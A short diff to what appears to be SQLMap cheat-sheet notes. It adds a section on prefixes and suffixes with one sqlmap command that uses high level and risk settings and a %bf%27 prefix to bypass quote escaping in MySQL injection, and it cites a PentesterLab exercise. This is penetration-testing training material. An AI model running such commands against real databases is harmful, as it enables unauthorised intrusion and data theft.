@@ -1,3 +1,9 @@
+Use Prefix and Suffix for more challneging attacks
+---------------------------------------------
+```
+# See example 9 https://pentesterlab.com/exercises/web_for_pentester_II/course
+sqlmap -r ./sqlmap-03.txt --level=5 --risk=3 --batch --prefix=%bf%27 --dbms=mysql
+```
 
 
 SQLMap Tamper Data
